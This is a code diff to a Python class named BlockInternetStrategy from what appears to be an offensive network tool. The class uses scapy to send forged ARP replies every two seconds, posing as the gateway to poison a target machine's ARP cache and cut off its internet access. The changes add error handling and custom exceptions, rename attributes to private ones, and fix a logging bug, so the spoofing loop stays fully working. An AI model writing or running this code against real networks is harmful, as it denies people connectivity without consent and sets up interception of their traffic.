@@ -14,6 +14,7 @@ import time
 
 from scapy.all import ARP, send
 from .strategy import AttackStrategy
+from ..exceptions.block_internet_exceptions import BlockInternetLoopError, BlockInternetStartError, BlockInternetStopError
 
 class BlockInternetStrategy(AttackStrategy):
     def __init__(self, target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str, logger):
@@ -26,11 +27,11 @@ class BlockInternetStrategy(AttackStrategy):
         :param gateway_mac: The MAC address of the gateway.
         :param logger: An instance of a logger to log messages.
         """
-        self.target_ip = target_ip
-        self.gateway_ip = gateway_ip
-        self.target_mac = target_mac
-        self.gateway_mac = gateway_mac
-        self.logger = logger
+        self._target_ip = target_ip
+        self._gateway_ip = gateway_ip
+        self._target_mac = target_mac
+        self._gateway_mac = gateway_mac
+        self._logger = logger
         self._running = False
         self._thread = None
 
@@ -41,11 +42,15 @@ class BlockInternetStrategy(AttackStrategy):
         It sends ARP replies to the target machine, pretending to be the gateway.
         """
         while self._running:
-            # Poison only the victim's ARP cache for gateway
-            send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip), 
-                 verbose=False)
-            
-            time.sleep(2)
+            try:
+                # Poison only the victim's ARP cache for gateway
+                send(ARP(op=2, pdst=self._target_ip, hwdst=self._target_mac, psrc=self._gateway_ip), 
+                    verbose=False)
+                
+                time.sleep(2)
+            except Exception as e:
+                self._logger.log(f"[!] Error during ARP spoofing: {e}")
+                raise BlockInternetLoopError("An error occurred in the ARP spoofing loop.") from e
 
     def start(self) -> None:
         """
@@ -53,24 +58,31 @@ class BlockInternetStrategy(AttackStrategy):
         This method creates a new thread to run the `_block_loop` method,
         allowing the attack to run in the background without blocking the main thread.
         """
-        if self._running:
-            self.logger.log("[!] Attack is already running.")
-            return
+        try:
+            if self._running:
+                self._logger.log("[!] Attack is already running.")
+                return
         
-        self._running = True
-        self._thread = threading.Thread(target=self._block_loop, daemon=True)
-        self._thread.start()
-        self.logger.log(f"[!] Internet blocked for {self.victim_ip}")
+            self._running = True
+            self._thread = threading.Thread(target=self._block_loop, daemon=True)
+            self._thread.start()
+            self._logger.log(f"[!] Internet blocked for {self._target_ip}")
+        except Exception as e:
+            self._logger.log(f"[!] Failed to start attack: {e}")
+            raise BlockInternetStartError("Failed to start the ARP spoofing attack.") from e
 
     def stop(self) -> None:
         """
         Stops the ARP spoofing attack by terminating the background thread.
         This method sets the `_running` flag to False and waits for the thread to finish.
         """
-        self._running = False
+        try:
+            self._running = False
 
-        if self._thread:
-            self._thread.join(timeout=1)
+            if self._thread:
+                self._thread.join(timeout=1)
 
-        self.logger.log(f"[!] Internet unblocked for {self.target_ip}")
-
+            self._logger.log(f"[!] Internet unblocked for {self._target_ip}")
+        except Exception as e:
+            self._logger.log(f"[!] Failed to stop attack: {e}")
+            raise BlockInternetStopError("Failed to stop the ARP spoofing attack.") from e
